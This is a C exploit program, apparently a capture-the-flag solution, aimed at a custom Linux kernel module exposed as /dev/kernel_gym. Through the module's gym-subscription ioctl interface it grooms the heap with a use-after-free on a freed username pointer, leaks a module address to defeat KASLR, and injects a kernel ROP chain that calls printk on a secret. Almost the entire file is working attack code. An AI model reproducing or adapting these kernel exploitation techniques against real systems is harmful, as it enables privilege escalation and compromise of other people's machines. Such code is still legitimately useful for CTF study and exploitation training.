#include "main.h"

// module gadgets
uint64_t pop_rdi_rbp_ret = 0x0000000000000189; // #: pop rdi; pop rbp; ret; 
uint64_t bebra = 0x75;
uint64_t pop_rbp_ret = 0x000000000000001c; // pop rbp; ret; 
uint64_t secret = 0x2810;
uint64_t printk = 0x16DD;

int main() {
    setup();
    uint64_t module_leak = do_aslr_leak();
    uint64_t module_base = module_leak - 0x20;
    //uint64_t module_base = 0xffffffffc0000000; // no-kaslr mode

    char * name1 = (char*) malloc(USERNAME_SIZE);
    char * password1 = (char*) malloc(PASSWORD_SIZE);
    char * name2 = (char*) malloc(USERNAME_SIZE);
    char * password2 = (char*) malloc(PASSWORD_SIZE);
    char * cookie1 = (char*) malloc(COOKIE_SIZE);
    char * cookie2 = (char*) malloc(COOKIE_SIZE);

    strcpy(name1, "attack-user#1");
    strcpy(password1, "attack-user#1-password");

    size_t ret = registration(name1, password1, ST_Default, 60);
    printf("{!} reg: %s\n", get_err_msg_by_code(ret));

    ret = login(name1, password1, cookie1);
    printf("{!} log: %s, cookie_size: %d, cookie: %s\n", 
        get_err_msg_by_code(ret), strlen(cookie1), cookie1);

    ret = sub_action(cookie1, A_SUB_CLOSE);
    printf("{!} close-sub: %s\n", get_err_msg_by_code(ret));

    // create new user
    uint64_t payload[8];
    payload[0] = module_base + pop_rbp_ret;
    payload[1] = module_base + bebra;
    payload[2] = module_base + pop_rdi_rbp_ret;
    payload[3] = module_base + secret; 
    payload[4] = 0x0;
    payload[5] = module_base + printk;

    strcpy(password2, "attack-user#2-password");
    
    ret = registration(payload, password2, ST_Default, 60);
    printf("{!} reg: %s\n", get_err_msg_by_code(ret));

    ret = login(payload, password2, cookie2);
    printf("{!} log: %s, cookie_size: %d, cookie: %s\n", 
        get_err_msg_by_code(ret), strlen(cookie2), cookie2);


    // triger bug
    ret = u_exit(cookie1);
    printf("{!} exit: %s\n", 
        get_err_msg_by_code(ret));

    ret = login(name1, password1, cookie1);
    printf("{!} log: %s, cookie_size: %d, cookie: %s\n", 
        get_err_msg_by_code(ret), strlen(cookie1), cookie1);

    // PWN!!
    sub_action(cookie1, A_SUB_CLOSE);

    return 0;
};

uint64_t do_aslr_leak() {
        // DO ASLR LEAK
    char * name1 = (char*) malloc(USERNAME_SIZE);
    char * password1 = (char*) malloc(PASSWORD_SIZE);
    char * name2 = (char*) malloc(USERNAME_SIZE);
    char * password2 = (char*) malloc(PASSWORD_SIZE);
    char * cookie1 = (char*) malloc(COOKIE_SIZE);
    char * cookie2 = (char*) malloc(COOKIE_SIZE);

    unsigned char * mch_list = (char*) malloc(4096);

    // create user and login
    strcpy(name1, "uaf-user#1");
    strcpy(password1, "uaf-user#1-password");

    size_t ret = registration(name1, password1, ST_Default, 60);
    printf("{!} reg: %s\n", get_err_msg_by_code(ret));

    ret = login(name1, password1, cookie1);
    printf("{!} log: %s, cookie_size: %d, cookie: %s\n", 
        get_err_msg_by_code(ret), strlen(cookie1), cookie1);

    ret = sub_action(cookie1, A_SUB_CLOSE);
    printf("{!} close-sub: %s\n", get_err_msg_by_code(ret));

    // create new user
    strcpy(name2, "aaaaaaa");
    strcpy(password2, "uaf-user#2-password");
    
    ret = registration(name2, password2, ST_Default, 60);
    printf("{!} reg: %s\n", get_err_msg_by_code(ret));

    ret = login(name2, password2, cookie2);
    printf("{!} log: %s, cookie_size: %d, cookie: %s\n", 
        get_err_msg_by_code(ret), strlen(cookie2), cookie2);

    
    gym_action(cookie2, A_GYM_CHOOSE_MCH, "machine{0}");

    // trigger free on username ptr
    ret = u_exit(cookie1);
    printf("{!} exit: %s\n", 
        get_err_msg_by_code(ret));

    ret = login(name1, password1, cookie1);
    printf("{!} log: %s, cookie_size: %d, cookie: %s\n", 
        get_err_msg_by_code(ret), strlen(cookie1), cookie1);
    
    char cookie3[256];
    char cookie4[256];
    
    registration("kekwer1\x00", "kekwer1\x00", ST_Default, 60);
    registration("kekwer2\x00", "kekwer2\x00", ST_Default, 60);
    login("kekwer1\x00", "kekwer1\x00", cookie3);
    login("kekwer2\x00", "kekwer2\x00", cookie4);

    sub_action(cookie1, A_SUB_CLOSE);
    sub_action(cookie3, A_SUB_CLOSE);
    sub_action(cookie4, A_SUB_CLOSE);

    registration("kekwer3\x00", "kekwer3\x00", ST_Default, 60);

    gym_action(cookie2, A_GYM_GET_MCH_LIST, mch_list);
    printf("mch_list: %s\n", mch_list);

    uint64_t destructor_leak = 0;
    memcpy(&destructor_leak, mch_list + (18*16+4), 8);
    printf("{!} Destructor leak: 0x%llx\n", destructor_leak);

    return destructor_leak;
}

void setup(void) {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    fd = open("/dev/kernel_gym", 0);

    if (fd < 0) {
        printf("{-} Error in device open, err = %d\n", fd);
        exit(0);
    }
}; 

size_t registration(char * name, char * password, 
    size_t sub_type, size_t sub_days) 
{
    u_reg_req_t * req = (u_reg_req_t*) malloc(sizeof(u_reg_req_t));
    req->username = name;
    req->password = password;
    req->type = sub_type;
    req->days_cnt = sub_days;

    size_t err = ioctl(fd, A_REGISTRATION, req);
    free(req);

    return err;
};

size_t login(char * name, char * password, char * out_cookie) {
    u_login_req_t * req = (u_login_req_t*) malloc(sizeof(u_login_req_t));

    req->username = name;
    req->password = password;
    req->cookie = out_cookie;

    size_t err = ioctl(fd, A_LOGIN, req);
    free(req);

    return err;
};

size_t u_exit(char * cookie) {
    u_exit_req_t * req = (u_exit_req_t*) malloc(sizeof(u_exit_req_t));
    req->cookie = cookie;

    size_t err = ioctl(fd, A_EXIT, req);
    free(req);
    
    return err;
};

size_t sub_action(char * cookie, size_t action) {
    u_sub_req_t * req = (u_sub_req_t*) malloc(sizeof(u_sub_req_t));
    
    req->cookie = cookie;
    req->freeze = 0;
    req->close = 0;
    req->update = 0;

    switch (action) {
        case A_SUB_FREEZE:
            req->freeze = 1;
            break;
        case A_SUB_CLOSE:
            req->close = 1;
            break;
        default:
            puts("{-} Invalid action in subscription!");
            return -1;
    }

    size_t err = ioctl(fd, action, req);
    free(req);
    
    return err;
};

size_t gym_action(char * cookie, size_t action, void * args) {
    u_gym_req_t * req = (u_gym_req_t*) malloc(sizeof(u_gym_req_t));
    
    req->cookie = cookie;
    req->get_mch_list = 0;
    req->choose_mch = 0;
    req->release_mch = 0;
    req->take_barb = 0;
    req->release_barb = 0;
    req->take_dumbl = 0;
    req->release_dumbl = 0;
    req->do_cradio = 0;
    req->release_cardio = 0;
    req->args = args;

    switch (action) {
        case A_GYM_GET_MCH_LIST:
            req->get_mch_list = 1;
            break;
        case A_GYM_CHOOSE_MCH:
            req->args_size = strlen(req->args);
            req->choose_mch = 1;
            break;
        case A_GYM_RELEASE_MCH:
            req->release_mch= 1;
            break;
        case A_GYM_TAKE_BARB:
            req->take_barb = 1;
            break;
        case A_GYM_RELEASE_BARB:
            req->release_barb = 1;
            break;
        case A_GYM_TAKE_DUMBL:
            req->take_dumbl = 1;
            break;
        case A_GYM_RELEASE_DUMBL:
            req->release_dumbl = 1;
            break;
        case A_GYM_DO_CARDIO:
            req->do_cradio = 1;
            break;
        case A_GYM_RELEASE_CARDIO:
            req->release_cardio = 1;
            break;
        default:
            puts("{-} Invalid action in GYM!");
            return -1;
    }

    size_t err = ioctl(fd, action, req);
    free(req);
    
    return err;
};

char* get_err_msg_by_code(int code) {
    switch(code) {
        case E_USERSPACE_POINTERS_INVL:
            return "Invalid userspace pointer";
        case E_REQUEST_POINTER_IS_NULL:
            return "Request pointer is NULL";
        case E_INCORRECT_REQ_OPTION:
            return "Incorrect request option";
        case E_USER_ALREADY_BUSY:
            return "User already busy";
        case E_COPY_FROM_USER:
            return "Error in copy from user";
        case E_NOTHING_TO_RELEASE:
            return "Nothing to release";
        case E_MCH_IS_BUSY:
            return "Machine is busy";
        case E_USER_ALREADY_ON_MCH:
            return "User already on machine";
        case E_USER_ISNT_ON_MCH:
            return "User isn't on machine";
        case E_MCH_ISNT_BUSY:
            return "Machine isn't busy";
        case E_MCH_ISNT_YOURS:
            return "Machine isn't yours";
        case E_USER_ISNT_LOGINED:
            return "User isn't logined";
        case E_COPY_TO_USER:
            return "Error in copy to user";
        case E_USER_ISNT_EXIST:
            return "User isn't exist";
        case E_INVALID_PASSWORD:
            return "Invalid passsword";
        case E_USER_ALREADY_EXIST:
            return "User already exist";
        case E_KMALLOC_NULLPTR:
            return "kmalloc return nullptr";
        case E_USER_NULLPTR:
            return "User is nullptr";
        case E_MCH_ISNT_EXIST:
            return "No such machine";
        case 0:
            return "OK!";
        default:
            return "UNKNOWN_ERR";
    }
};